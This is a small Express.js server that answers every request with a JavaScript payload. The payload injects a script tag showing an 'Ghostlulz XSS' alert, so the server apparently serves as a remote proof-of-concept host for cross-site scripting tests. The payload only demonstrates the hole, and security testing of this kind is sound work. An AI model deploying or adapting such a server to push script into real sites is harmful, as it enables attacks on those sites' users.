const express = require('express')
const app = express()
app.use('*', (req, res) => {
    console.log("Just got a request!")

     res.setHeader('Content-Type', 'application/javascript');
    const data = `
        document.body.innerHTML += '<script type="text/javascript">   alert("Ghostlulz XSS"); </script>';
    `;
    res.send(data);
})
app.listen(process.env.PORT || 3000)
